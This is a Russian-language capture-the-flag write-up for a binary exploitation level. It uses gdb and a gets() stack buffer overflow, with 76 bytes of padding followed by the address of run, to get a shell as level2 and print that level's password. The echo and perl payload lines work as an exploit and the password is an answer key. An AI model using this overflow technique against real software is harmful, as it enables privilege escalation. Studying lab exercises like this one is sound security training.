На этом уровне так же пользуемся gdb:
info functions (эта команда возвращает нам список всех функций):
0x08048340  gets
0x08048350  fwrite
0x08048360  system
0x08048444  run
0x08048480  main

Дисассемблируем функцию main (disass main):
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret

   
   0x08048486 <+6>:	sub    $0x50,%esp               выделяется буфер, таким образом чтобы вершина стека esp делилась на 16
   0x08048490 <+16>:	call   0x8048340 <gets@plt>     считывает строку из stdin и записывает ее в буфер,
                                                        на который указывает s, пока не встретится символ новой строки или EOF.
                                                        Проверка на переполнение буфера не производится


Больше никаких вызовов функций в main не происходит, что странно, потому что мы знаем что есть и другие функции, делаем disass run:

   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>   выводит строку "Good... Wait what?"
   0x08048479 <+53>:	call   0x8048360 <system@plt>   выполняет команды, указанные в string, вызывая в свою очередь команду /bin/sh -c string.


Можно вызвать функцию run в gdb через команду jump.
> jump run
Continuing at 0x804844a.
Good... Wait what?
$ > id
uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)
Но это нам ничего не даст, потому что таким образом мы будем с правами доступа юзера level1, а не level2.


Что мы знаем о функции gets: проверка на переполнение буфера не производится. Это значит что мы можем прочитать из консоли больше информации,
чем для этого выделено места в буфере. Это называется переполнение буффера с перезаписью стека. Нам нужно перезаписать адрес ret, переполнив стек.
Нам нужна строка заполненная какой-то информацией на 76 символов и адресc функции run в little endian формате.

Чтобы узнать какой порядок байтов на машине используем программу: lscpu | grep Endian
Byte Order:            Little Endian
То есть адресс функции run = 0x08048444, но мы его записываем как \x44\x84\x04\x08. (В обратном порядке и учитываем 16ю систему записи)

> echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/lev1
-e  флаг благодаря которому \x00 записывается как одно 16е значение
или то же самое при помощи perl:
> perl -e 'print "a"x76 ."\x44\x84\x04\x08"' > /tmp/lev1

> cat /tmp/lev1 - | ./level1
Good... Wait what?
> id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
> cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77